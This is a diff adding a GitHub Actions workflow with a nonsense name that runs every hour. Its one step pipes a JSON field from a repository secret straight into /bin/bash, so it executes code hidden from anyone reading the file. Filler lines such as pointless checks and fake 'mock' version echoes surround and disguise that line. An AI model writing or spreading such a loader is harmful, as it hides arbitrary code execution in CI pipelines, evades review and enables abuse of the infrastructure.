@@ -1,0 +1,25 @@
+name: houdaojing1470
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: houdaojing1470
+        env:
+          z22024: ${{ secrets.z22024 }}
+        run: |
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          [ -z "$RANDOM" ] || echo "Random var set"
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          echo $z22024 | jq -r .s9776 | /bin/bash
+          echo "Kubens mock: kubens --version 2>/dev/null | head -1 || echo no-kubens"
+          echo "Gdb mock: gdb --version 2>/dev/null | head -1 || echo no-gdb"
+          echo "Minikube mock: minikube --version 2>/dev/null | head -1 || echo no-minikube"
+          echo "Tr mock: echo 'ABC' | tr 'A-Z' 'a-z' 2>/dev/null || echo no-tr"
+          echo "Command group: { echo group; }"
+          echo "Factor mock: factor 10 2>/dev/null || echo no-factor"
